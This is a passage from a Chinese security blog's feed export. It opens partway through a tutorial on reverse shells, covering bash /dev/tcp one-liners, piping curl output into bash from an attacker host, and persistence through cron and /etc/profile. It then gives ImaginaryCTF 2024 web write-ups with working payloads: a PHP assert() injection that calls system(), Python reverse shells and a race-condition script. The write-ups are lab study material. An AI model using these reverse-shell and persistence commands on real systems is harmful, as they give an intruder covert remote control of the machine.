class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>如果当前<code>shell</code>环境不是<code>bash</code>，可以先构造<code>bash</code>环境：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>对bash反弹一句话进行拆分说明：</p><table><thead><tr><th align="center">命令</th><th align="center">命令解释</th></tr></thead><tbody><tr><td align="center"><code>bash -i</code></td><td align="center">产生一个bash交互环境</td></tr><tr><td align="center"><code>&gt; &amp;</code></td><td align="center">将标准输出和标准错误输出重定向到同一个位置</td></tr><tr><td align="center"><code>/dev/tcp/IP/port</code></td><td align="center">Linux万物皆文件，这段命令的意思是让目标主机与攻击机建立一个<code>tcp</code>连接。</td></tr><tr><td align="center"><code>0&gt;&amp;1</code></td><td align="center">将标准输入重定向到标准输出的位置</td></tr></tbody></table><p>总结一下：</p><p>在bash交互环境下，把目标主机的输出流重定向到攻击机，再把输入流重定向到输出流的地址，也就是重定向到攻击机。</p><h2 id="curl反弹"><a href="#curl反弹" class="headerlink" title="curl反弹"></a>curl反弹</h2><p><em>比基础反弹的payload简单一点，但是需要对攻击机有一点要求。</em></p><h3 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h3><p>开一个端口，写下<code>index.html</code>（或<code>index.php</code>），内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><p>指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl IP:port | bash</span><br></pre></td></tr></table></figure><p>这里为什么要加<code>bash</code>呢：</p><blockquote><p>Bash 是一种 Unix shell 和命令语言解释器。它会执行接收到的输入内容。</p></blockquote><p><code>curl</code>后会得到一个字符串：<code>bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1</code>，<code>bash</code>接收curl的结果也就是该字符串，并执行。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><strong>万变不离其宗</strong>。<strong>本质上</strong>，只要让靶机执行一个指令（<strong>反弹shell一句话</strong>）即可。那么怎么让靶机执行这个指令，就有很多种方法。可以直接执行，也可以读取字符串再执行等等。</p><p>再深入一点，<strong>看问题需要看到本质</strong>！上面那段话，就是我们<strong>抓住了本质</strong>，才有那么多方法。如果只是想着在前端直接执行，那么很多方法是想不到的，同时很多题也是做不了的。</p><h2 id="定时反弹"><a href="#定时反弹" class="headerlink" title="定时反弹"></a>定时反弹</h2><p>简单来说，就是将<strong>反弹shell一句话</strong>写入<strong>定时任务文件</strong>。</p><p>要知道该文件的位置，必须先知道目标主机当前的用户名。如果当前用户名是<code>Pax</code>，对于不同的操作系统该文件路径如下：</p><ul><li><strong>centos： &#x2F;var&#x2F;spool&#x2F;cron&#x2F;Pax</strong></li><li><strong>Debian&#x2F;Ubuntu：&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;Pax</strong></li></ul><p>在该文件写入以下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span></span><br></pre></td></tr></table></figure><blockquote><p><code>*/1 * * * *</code>: 这是cron的时间格式，表示每分钟执行一次任务。格式为<code>分钟 小时 日期 月份 星期</code>。</p></blockquote><h2 id="写入-etc-profile"><a href="#写入-etc-profile" class="headerlink" title="写入/etc/profile"></a>写入<code>/etc/profile</code></h2><p><code>/etc/profile</code> 是一个在<code>Linux</code>系统中用于设置系统范围内环境变量和启动脚本的配置文件。它通常在每个用户登录时由系统<strong>读取和执行</strong>。</p><p>将反弹shell一句话写入<code>/etc/profile</code>文件中，<code>/etc/profile</code>中的内容会在用户打开<code>bash</code>窗口时执行。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/47.xxx.xxx.72/</span><span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> &amp;</span><br><span class="line"><span class="comment"># 最后面那个&amp;为的是防止管理员无法输入命令</span></span><br></pre></td></tr></table></figure><p>当有用户连接该主机时，就会自动执行该命令，成功获得目标机的<strong>shell</strong>。</p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>如果你能看到这里，那我愿意说出自己的感悟。</p><p>本节采用的反弹技术，无一例外都是希望目标主机可以执行<strong>反弹shell一句话</strong>。再深入一点，每个方法都是希望目标主机可以执行指令。目标主机可以执行指令的点有很多，哪怕不能执行本机文件，我们还能构造异地文件让目标主机读取。</p><p>本节方法的本质就是让目标文件执行指令。看到本质，困难就迎刃而解。</p><h1 id="0x03-未完成"><a href="#0x03-未完成" class="headerlink" title="0x03 未完成"></a>0x03 未完成</h1><p>剩下的有空再写，好累的说······</p>]]></content>
      
      
      <categories>
          
          <category> getshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ImaginaryCTFWeb</title>
      <link href="/2024/07/27/ImaginaryWeb/"/>
      <url>/2024/07/27/ImaginaryWeb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>打<code>CTF</code>，我认为经验与思维同样重要。但是，我的重心会放在思维与推理上面。安全一途，博大精深，只有善于思考和推理，才能走得更远！</strong></p><h1 id="0x01-readme"><a href="#0x01-readme" class="headerlink" title="0x01 readme"></a>0x01 readme</h1><p>有附件，先搭建题目环境。</p><p>题目附件肯定要仔细查看的，发现flag的环境变量：</p><h2 id="FLAG变量"><a href="#FLAG变量" class="headerlink" title="FLAG变量"></a>FLAG变量</h2><p><code>Dockerfile</code>文件</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENV</span> FLAG=<span class="string">&quot;ictf&#123;path_normalization_to_the_rescue&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><code>docker-compose.yml</code>文件</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">environment</span><span class="punctuation">:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">FLAG=flag&#123;test_flag&#125;</span></span><br></pre></td></tr></table></figure><p>两个文件的关系：</p><blockquote><ul><li><strong>Dockerfile</strong>：<ul><li>环境变量在镜像构建过程中可用，并且在基于该镜像启动的所有容器中可用。</li></ul></li><li><strong>docker-compose.yml</strong>：<ul><li>环境变量仅在通过 Docker Compose 启动的容器中可用，且可以在不同的服务中定义不同的值。</li></ul></li></ul></blockquote><p>覆盖机制：</p><blockquote><p>如果在 Dockerfile 中定义了 <code>ENV FLAG</code>，而在 <code>docker-compose.yml</code> 中又定义了相同的环境变量 <code>FLAG</code>，则在运行容器时，<code>docker-compose.yml</code> 中的值会覆盖 Dockerfile 中的值。</p></blockquote><p>再观察<code>start.sh</code>文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;FLAG:-not_flag&#125;</span>&quot;</span> &gt; /app/public/flag.txt</span><br><span class="line">nginx &amp;</span><br><span class="line">node src/app.js</span><br></pre></td></tr></table></figure><p>这就会在容器的对应目录下创建<code>flag.txt</code>，如果只是看附件源码时找不到<code>flag.txt</code>，只能去容器里面查看。</p><h2 id="限制访问"><a href="#限制访问" class="headerlink" title="限制访问"></a>限制访问</h2><p>可以直接访问<code>flag.txt</code>吗？看看<code>default.conf</code>文件：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">if</span> (-f <span class="variable">$request_filename</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">404</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这段配置的逻辑是：如果请求的静态文件存在，则返回 404 错误。这通常用于防止直接访问某些静态文件，或者用于特定的安全策略。</p><p>显然，我们不能直接访问<code>flag.txt</code>文件。但是就本题而言，如果要得到<code>flag.txt</code>文件，我们只能通过路径访问。显然，我们得绕过这个限制。</p><p>我们可以通过对路径的一些处理，来绕过这个限制。（原理之后会深究）</p><p>下面采用爆破</p><h2 id="fuzz爆破"><a href="#fuzz爆破" class="headerlink" title="fuzz爆破"></a>fuzz爆破</h2><p>思路：使用<code>bp</code>，对路径末尾添加<code>payload</code>，以绕过<code>nginx</code>对直接访问静态文件的限制。</p><p><img src="/./../images/posts/ImaginaryWeb/image-20240727183136959.png"></p><p>字典选择：<code>SecLists-master\Fuzzing\Unicode.txt</code></p><p>结果：</p><p><img src="/./../images/posts/ImaginaryWeb/image-20240727183525826.png"></p><p>如果用curl表示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@pax:~<span class="comment"># curl --path-as-is http://localhost:8000/flag.txt/.</span></span><br><span class="line">flag&#123;test_flag&#125;</span><br></pre></td></tr></table></figure><p>如果把参数<code>--path-as-is</code>去掉会导致访问失败（浏览器同理），因为出于某些机制（尚未搞清）会把最后那个点去掉，导致实际访问的URL是：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8000/flag.txt/</span><br></pre></td></tr></table></figure><p>但是可以通过编码<code>/</code>成<code>%2F</code>来绕过，点号编码不编码都可以。</p><p>最后还有一个问题：为什么URL最后必须添加<code>/.</code>或者<code>/./.</code>（可以一直延续）才能正确访问？这应该涉及到nginx解析URL的原理了。</p><h2 id="问题与心得"><a href="#问题与心得" class="headerlink" title="问题与心得"></a>问题与心得</h2><p><strong>问题</strong></p><ul><li>把url化成最简形式的机制是什么？</li><li>为什么本题URL必须添加<code>/.</code>或者<code>/./.</code>才能成功访问？</li></ul><p><strong>写题思路</strong></p><ol><li>首先，需要分析flag在哪里，这是很重要的一个出发点。</li><li>得知flag在flag.txt里，思考怎么访问flag.txt，需要查看nginx的URL解析规则。</li><li>解析规则不允许直接访问，尝试绕过，本次学习到可以通过fuzz来爆破出可行的URL。</li></ol><p><strong>不足之处</strong></p><ul><li>对Docker的镜像架构理解尚浅，这在一定程度上影响了分析。</li></ul><h1 id="0x02-joural"><a href="#0x02-joural" class="headerlink" title="0x02 joural"></a>0x02 joural</h1><h2 id="flag在哪"><a href="#flag在哪" class="headerlink" title="flag在哪"></a>flag在哪</h2><p>给了附件，看看<code>dockerfile</code>文件：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag.txt /flag.txt</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /var/www/html/files/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mv</span> /flag.txt /flag-`<span class="built_in">tr</span> -dc A-Za-z0-9 &lt; /dev/urandom | <span class="built_in">head</span> -c 20`.txt</span></span><br></pre></td></tr></table></figure><p><code>flag.txt</code>在网页根目录下。</p><p>再看看题目简介，简介说本题没有LFI，这会不会是”此地无银三百两“呢？看看源码就知道了。</p><h2 id="源码逻辑"><a href="#源码逻辑" class="headerlink" title="源码逻辑"></a>源码逻辑</h2><p>核心源码：<code>index.php</code></p><p><img src="/./../images/posts/ImaginaryWeb/image-20240727205456514.png"></p><p>先看明白源码的流程，发现有两个函数不认识：</p><p>**assert()**：接受字符串作为参数，参数被当作PHP代码执行。如果参数表达式为<code>false</code>，或者参数表达式运行时抛出异常，则<code>assert()</code>返回<code>false</code>。</p><p>**strpos()**：返回参数2在参数1中首次出现的数字位置。如果只有一个参数，会弹出<code>warning</code>，但是不会停止程序运行。</p><p>那么逻辑很清晰了。接受<code>GET</code>参数<code>file</code>，判断后文件包含。</p><p>从哪里入手呢？</p><h2 id="两种思路"><a href="#两种思路" class="headerlink" title="两种思路"></a>两种思路</h2><p>最开始想过目录穿越。但是参数传到后端会解码一次，该过滤还是会被过滤。</p><p>看到<code>assert()</code>函数，其参数会被当做<code>PHP</code>代码执行，为什么不能通过操控<code>$file</code>实现<code>PHP</code>代码注入呢？</p><p>想到代码注入的原因：如果字符串被当做代码执行，可控变量又可以插入到字符串中，那么就可以控制变量进而控制程序。</p><p>代码工作的地方在<code>assert()</code>参数内，最好使<code>assert()</code>返回true（这并不难）。我们的目标是逃离<code>strpos()</code>函数，用<code>system()</code>函数<code>getshell</code>。</p><p>结合上面所学，构造<code>paylaod</code>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=aaa&#x27;) or system(&#x27;tac /flag-8w3yLv5F9tZdMcBG3IDM.txt&#x27;);//</span><br></pre></td></tr></table></figure><p>工作语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;aaa&#x27;) or system(&#x27;ls&#x27;);//&#x27;, &#x27;.&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Invalid file!&quot;</span>);</span><br><span class="line"><span class="comment">//简化</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;aaa&#x27;) or system(&#x27;ls&#x27;);&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Invalid file!&quot;</span>);</span><br><span class="line"><span class="comment">//简化</span></span><br><span class="line"><span class="title function_ invoke__">strpos</span>(<span class="string">&#x27;aaa&#x27;</span>) <span class="keyword">or</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="comment">//简化</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><p><code>getshell</code>就够了，就不写如何<code>getflag</code>了。</p><h2 id="做题心得"><a href="#做题心得" class="headerlink" title="做题心得"></a>做题心得</h2><p><strong>思路</strong></p><p>先确定flag在哪里，再看看代码逻辑。对代码逻辑进行分析，大胆猜想小心求证，最后成功<code>getshell</code>。</p><p><strong>不足之处</strong></p><p>对一些函数了解较少，这是可以查阅的。但是必须对函数的功能要敏感，这是查阅不到的，必须努力培养。</p><h1 id="0x03-p2c"><a href="#0x03-p2c" class="headerlink" title="0x03 p2c"></a>0x03 p2c</h1><h2 id="定位flag"><a href="#定位flag" class="headerlink" title="定位flag"></a>定位flag</h2><p>flag在项目的根目录下，这也决定了本题应该要<code>getshell</code>。</p><h2 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h2><p>关注这个函数：</p><p><img src="/./../images/posts/ImaginaryWeb/image-20240728122639549.png"></p><p><code>code</code>就是<code>POST</code>参数，直接从表单里输入即可。</p><p>输入的内容会写在<code>main()</code>里面，<code>main()</code>被当作参数的时候就会被执行，所以我们只需要关注怎么构造<code>payload</code>即可。</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>注入语句并不会回显，可以采用反弹<code>shell</code>，这里先<code>curl</code>一下看看代码是否有误</p><p><code>curl</code>失败了，直接试试反弹<code>shell</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;bash -i &amp;&gt; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>监听段没有丝毫反映。猜想是不是服务端没有使用<code>bash</code>，于是先构造<code>bash</code>再执行反弹：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;bash -c &#x27;bash -i &amp;&gt; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">cmd = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line">process = os.popen(cmd)</span><br></pre></td></tr></table></figure><p>成功反弹<code>shell</code>。</p><h2 id="盲注-·-伪随机"><a href="#盲注-·-伪随机" class="headerlink" title="盲注 · 伪随机"></a>盲注 · 伪随机</h2><p>彩虹表是另外一种做法，本质上是利用伪随机的思想。</p><p>原理是随机构造<code>rgb</code>的代码可知，在本地构建彩虹表。</p><p>利用<code>flag</code>不同字符产生的<code>rgb</code>不同，一一对照彩虹表，可以得到逐步得到完整的<code>flag</code>——这何尝不是一种盲注呢？</p><h2 id="问题与心得-1"><a href="#问题与心得-1" class="headerlink" title="问题与心得"></a>问题与心得</h2><p><strong>问题</strong></p><ul><li><p>为什么curl不成功，是什么导致的？</p><ul><li>答：<code>/bin</code>和<code>/usr/bin</code>都没有curl这个可执行文件，也就是没有<code>curl</code>这个指令。</li></ul></li><li><p>为什么会想到<code>bash</code>环境？</p><ul><li>当做经验记住吧。</li></ul></li></ul><p><strong>心得</strong></p><ul><li>写题前把有关文件都看一遍，不能偷懒。</li></ul><h1 id="0x04-crystals"><a href="#0x04-crystals" class="headerlink" title="0x04 crystals"></a>0x04 crystals</h1><p>推荐题解：<a href="https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/crystals/">crystals | siunam’s Website (siunam321.github.io)</a></p><h2 id="寻找flag"><a href="#寻找flag" class="headerlink" title="寻找flag"></a>寻找flag</h2><p>项目里没有<code>flag</code>相关文件，在<code>docker-compose.yml</code>文件有：</p><p><img src="/./../images/posts/ImaginaryWeb/image-20240729114140758.png"></p><p>这里我找了好久<code>$FLAG</code>，其实没有必要。这段代码的意思是自己写一个<code>flag</code>放上去，那我就直接写<code>flag</code>。</p><p>这段过程可能没有必要拿来谈，有些人一看就明白了。但是介于我在这里耗了很久，必须记一下。</p><p>综上所述：<code>flag</code>在主机名里。</p><h2 id="得到主机名"><a href="#得到主机名" class="headerlink" title="得到主机名"></a>得到主机名</h2><p>现在的思路就是如何得到主机名。</p><p>最开始我想通过<code>getshell</code>然后查看系统的相关文件文件得到主机名，但是<code>index.rb</code>全是静态内容，没有输入点。</p><p>无奈之下只能看题解。下面的内容是我希望自己能推理出的：</p><blockquote><p>就利用<strong>输入</strong>而言，如果不同的输入能得到不同的输出，那么我们就有很多方法。</p><p>但是如果没有<strong>输入点</strong>，或者说没有常规的输入点，这些方法就陷入了死区。</p><p>但这并不意味着没有办法，好比<code>SQL</code>注入的报错注入，输对了没反应，但是输错了反而会得到信息。</p><p>所以，不妨找找这里是否有报错回显信息的漏洞。</p><p><code>nginx</code>接受HTTP请求并将请求转发给后端应用服务器（我们不知道服务器是什么，但是肯定跟<code>sinatra</code>框架有关)，所以将报错和<code>sinatra</code>结合起来，我们或许可以找到破解之道。</p></blockquote><p>但是我没搜到相关的内容，只能借鉴大佬的题解：</p><p><code>Sinatra</code> 默认使用 <code>Ruby</code> 的 <code>WEBrick</code> 服务器来处理请求。当请求出错时，<code>WEBrick</code> 会生成一个错误页面，并在 <code>&lt;ADDRESS&gt;</code> 标签中包含服务器的信息——主机名就在其中。</p><p>那么直接<code>fuzz</code>，<code>payload</code>是<code>GET</code>参数：</p><p><img src="/./../images/posts/ImaginaryWeb/image-20240729154351061.png"></p><p>得到<code>flag</code>：</p><p><img src="/./../images/posts/ImaginaryWeb/image-20240729154554334.png"></p><h2 id="思考-·-进阶"><a href="#思考-·-进阶" class="headerlink" title="思考 · 进阶"></a>思考 · 进阶</h2><p><em>哪怕想破脑袋，也想不出破局之道。这是常有的事情，但不应该是被轻视的问题。</em></p><p>安全一途，经验固然重要，但是思维和推理也不能轻视。</p><p>当我知道本题没有输入点的时候，我应该换一种想法，或者说退一步想：</p><ul><li><p>有输入点的时候，这是一个多元的操作，通过不同的操作得到不同的结果。</p></li><li><p>没有输入点的时候，要么操作正常，要么操作错误，是一个二元的操作。既然操作正常的情况下毫无所得，为什么不想想操作错误的情况下是否会披露信息呢？思路是不是又拓宽了呢?</p></li></ul><p><strong>有输入，试输入；无输入，试错误。</strong>方法肯定不止这么点，领悟到精髓即可。</p><h1 id="0x05-the-amazing-race"><a href="#0x05-the-amazing-race" class="headerlink" title="0x05 the_amazing_race"></a>0x05 the_amazing_race</h1><h2 id="黑盒？"><a href="#黑盒？" class="headerlink" title="黑盒？"></a>黑盒？</h2><p>本题没有附件，但是有给核心源码。源码说的很清楚，迷宫通关才能得到<code>flag</code>。那就只能看源码了。</p><h2 id="第一次尝试-·-SSTI"><a href="#第一次尝试-·-SSTI" class="headerlink" title="第一次尝试 · SSTI"></a>第一次尝试 · SSTI</h2><p>我的思维太局限了，总是想基础漏洞。所以当我看到下面这段代码，就想尝试<code>SSTI</code>：</p><p><img src="/./../images/posts/ImaginaryWeb/image-20240730192734774.png"></p><p>但是如果输入的<code>mazeId</code>不是正确的，系统会报错。</p><h2 id="第二次尝试-·-线程竞争"><a href="#第二次尝试-·-线程竞争" class="headerlink" title="第二次尝试 · 线程竞争"></a>第二次尝试 · 线程竞争</h2><p>讲讲思路：</p><p>为什么<code>SSTI</code>不行？因为题目不允许任意构造<code>mazeId</code>。那么竟然没有基础漏洞，我为什么不能从题目的逻辑入手，这正是<code>CTF</code>的两种漏洞类型：</p><ul><li>系统漏洞</li><li>逻辑漏洞</li></ul><p>那从游戏本身入手：</p><p>​我们要拿到flag，就必须到达flag的位置。要到达flag的位置，仅仅靠正常玩游戏是不可能的。</p><p>​如果能耍赖就好了！耍赖？怎么耍赖？穿墙！</p><p>​没错，如果可以穿墙，那我就可以很快拿到flag！</p><p>​穿墙的原理是什么，看看下面的代码：</p><p><img src="/./../images/posts/ImaginaryWeb/image-20240730193637733.png"></p><p>一言以蔽之：如果能线程竞争，在允许我走一步的情况下不断发出指令，我就可以走好几步。原理如下：</p><blockquote><p><strong>竞态条件（Race Conditions）</strong>：</p><ul><li>当程序的输出或行为依赖于无法控制的事件（如多个线程的并发执行）时，就会发生竞态条件。</li><li>在这个代码中，如果多个请求同时访问 <code>/move</code> 端点，就可能发生竞态条件。因为SQLite用来存储迷宫状态，所以并发的读取和写入可能导致状态不一致，例如两个线程都认为它们对某个单元格有独占访问权并同时进行写入。</li></ul><p><strong>缺乏同步（Synchronization）</strong>：</p><ul><li>代码中没有包括任何锁机制来防止并发访问数据库或共享资源。没有正确的同步，可能会出现一个请求读取迷宫状态时，另一个请求正在修改状态的情况，从而导致潜在的不一致</li></ul></blockquote><p>这其实不算是严格的逻辑漏洞，也是一种系统漏洞。如果数据库不能实现立即更新玩家位置信息，就会产生线程竞争。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">mazeId = <span class="string">&quot;2c49d90b-4cb5-47b4-be88-e0ba34042295&quot;</span></span><br><span class="line"><span class="comment"># Can tunnel through walls in specified direction if there&#x27;s at least</span></span><br><span class="line"><span class="comment"># one empty space before the wall</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Run, readjust position/direction as desired, repeat until flag</span></span><br><span class="line">url = <span class="string">f&quot;http://localhost:6563/move?id=<span class="subst">&#123;mazeId&#125;</span>&amp;move=right&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    Popen([<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-X&quot;</span>, <span class="string">&quot;POST&quot;</span>, url])</span><br><span class="line">    sleep(<span class="number">.00</span>)</span><br></pre></td></tr></table></figure><h2 id="思考-·-进阶-1"><a href="#思考-·-进阶-1" class="headerlink" title="思考 · 进阶"></a>思考 · 进阶</h2><p>在<code>CTF</code>比赛里，单独考基础漏洞不会多，逻辑漏洞和其他漏洞同样有很多。所以我们的思路不应该直接想基础漏洞，而是应该根据代码逻辑来决定下一步。当我们没思路时，不妨先找找输入点，看看这些参数的生命周期。当没有输入点或者输入点不可控时，就要转换思路。会不会是报错披露？会不会是<code>fuzz</code>？</p><p>所以我们的思想很简单：</p><ul><li>先把代码认真看完，再根据代码进行分析，我们的思维不要局限于漏洞，不要局限于漏洞，不要局限于漏洞！</li></ul><p>漏洞、逻辑、常规服务······这些都可以被我们利用。</p><p><strong>安全一途，切忌局限思维。多想，多分析，多试，多总结。</strong></p><h1 id="0x06-readme2"><a href="#0x06-readme2" class="headerlink" title="0x06 readme2"></a>0x06 readme2</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>核心源码：</p><p><img src="/./../images/posts/ImaginaryWeb/image-20240731163110130.png"></p><p>4000端口是开放的，3000只在内网开放。但是<code>flag.txt</code>在3000端口，我们该怎么得到flag呢？</p><p>再看看4000端口的服务：把一切和flag有关的都403。我在这方面尝试了一会，无果。</p><p>但是4000端口的服务有一个非常重要的函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title function_">URL</span>(url.<span class="property">pathname</span> + url.<span class="property">search</span>, <span class="string">&#x27;http://localhost:3000/&#x27;</span>)</span><br></pre></td></tr></table></figure><p>利用点在这里：</p><p><img src="/./../images/posts/ImaginaryWeb/image-20240731164617007.png"></p><p>那么现在有了一个突破点：<strong>url.pathname</strong>，怎么调控和利用该点呢？</p><h2 id="调控"><a href="#调控" class="headerlink" title="调控"></a>调控</h2><p>修改一下代码， 让<code>url.pathname</code>可以被写入日志：</p><p><img src="/./../images/posts/ImaginaryWeb/man.png"></p><p>docker日志就会显示<code>pathname</code>：</p><p><img src="/./../images/posts/ImaginaryWeb/man2-1722417627179-4.png"></p><p>前面有两条斜杠没问题，格式如此。以上我们实现了重定向，接下来重定向到3000端口即可。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>基于上面的尝试，我们写出重定向脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://localhost:3000/flag.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>具体请求：</p><p><img 